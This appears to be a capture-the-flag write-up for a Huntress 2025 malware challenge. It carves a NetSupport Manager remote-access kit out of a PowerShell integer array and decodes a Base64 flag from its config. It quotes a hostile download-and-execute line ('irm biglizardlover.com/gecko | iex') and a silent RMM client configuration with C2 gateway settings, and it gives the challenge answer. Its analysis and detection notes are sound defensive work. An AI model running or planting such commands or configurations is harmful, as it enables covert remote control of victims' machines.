# Huntress 2025 — Day 23 / NetSupport (Malware)

**Category:** Malware  
**Prompt:** An unexpected RMM tool was identified on a laptop. A suspicious PowerShell script was dropped around the same time. _Find the link between them._  
**Archive password:** `netsupport`

---

## TL;DR
The PowerShell artifact embedded a large comma‑separated integer array that reconstructs to a **ZIP** (magic `PK\x03\x04`). Extracting it reveals a full **NetSupport Manager** client bundle (`client32.exe`, DLLs, and multiple `*.ini`). The operator config—including an embedded **Base64-encoded flag**—lives in `download/CLIENT32.ini` under the `[Bridge]` section. Decoding `ZmxhZ3tiNmU1NGQwYTBhNWYyMjkyNTg5YzM4NTJmMTkzMDg5MX0NCg==` yields:

```
flag{b6e54d0a0a5f2292589c3852f1930891}
```

---

## Artifacts
- Suspicious PS line:  
  ```powershell
  irm biglizardlover.com/gecko | iex
  ```
  > `irm` = `Invoke-RestMethod`; `| iex` = execute fetched content.

- Unzipped contents after reconstruction (partial):
  ```text
  download/
    AudioCapture.dll
    client32.exe
    CLIENT32.ini
    HTCTL32.DLL
    kfla.exe
    msvcr100.dll
    nskbfltr.inf
    NSM.ini
    NSM.LIC
    nsm_vpro.ini
    pcicapi.dll
    PCICHEK.DLL
    PCICL32.DLL
    remcmdstub.exe
    TCCTL32.DLL
  ```

---

## Method

### 1) Recognize embedded ZIP from integer array
The PS file contained a massive numeric array. Convert the integers to bytes and preview a slice to verify the file type (look for `PK\x03\x04`).

```python
payload = open("payload.txt","r").read()
data = bytes(int(x) for x in payload.split(",") if x.strip())
print(data[:32])
# -> b'PK\x03\x04...'  # ZIP magic
```

### 2) Rebuild the ZIP and extract
```python
with open("file.zip","wb") as f:
    f.write(data)
```

```bash
unzip file.zip -d extracted
```

### 3) Pivot to NetSupport configuration
Open `extracted/download/CLIENT32.ini`. Notable fields:

```ini
[Client]
silent=1
SKMode=1
SysTray=0
Usernames=*

[Bridge]
PasswordFile=C:\Program Files\NetSupport\NetSupport Manager\bridgegevvwe21.psw
Flag=ZmxhZ3tiNmU1NGQwYTBhNWYyMjkyNTg5YzM4NTJmMTkzMDg5MX0NCg==

[HTTP]
GatewayAddress=polygonben.github.io
GSK=FN;J?ACCHJ<O?CBEGB;MEC:B
Port=443
SecondaryGateway=@polygonben
```

Observations:
- **Stealthy client** (`silent=1`, `SysTray=0`, `HideWhenIdle=1` elsewhere) → classic hands‑off RMM foothold.
- Gateway config indicates **internet C2 relay** behavior common to NetSupport deployments.
- Embedded `Flag=` value is Base64.

### 4) Decode the embedded flag
```bash
echo 'ZmxhZ3tiNmU1NGQwYTBhNWYyMjkyNTg5YzM4NTJmMTkzMDg5MX0NCg==' | base64 -d
# flag{b6e54d0a0a5f2292589c3852f1930891}
```

---

## Outcome
- **Answer / Flag:** `flag{b6e54d0a0a5f2292589c3852f1930891}`
- **Link between PS and RMM:** The PS artifact reconstructs a NetSupport Manager **client kit** that, once run, silently enrolls to the operator’s gateway and carries the flag in its config.

---

## Threat‑Hunting Notes (bonus)

- **File magic & carving:** If only the PS array is present, look for ZIP magic `50 4B 03 04`.  
- **Process lineage:** Parent PowerShell spawning `client32.exe` / `remcmdstub.exe`.  
- **Registry/FS:** NetSupport paths under `C:\Program Files\NetSupport\` and user profile temp/cache.  
- **Network:** Outbound 443 to atypical hosts (e.g., GitHub Pages / custom domains), SNI or JA3 tied to NetSupport.  
- **Prevention tip:** Block `powershell.exe -EncodedCommand`/suspicious download‑execute patterns; AMSI/Defender scripting policies; EDR rule for `irm ... | iex`.

---

## Appendix — Minimal Rebuilder Script
```python
# rebuild_zip.py
with open("payload.txt","r") as f:
    nums = [int(x) for x in f.read().split(",") if x.strip()]
data = bytes(nums)
open("file.zip","wb").write(data)
print("[+] wrote file.zip (size=%d)" % len(data))
```
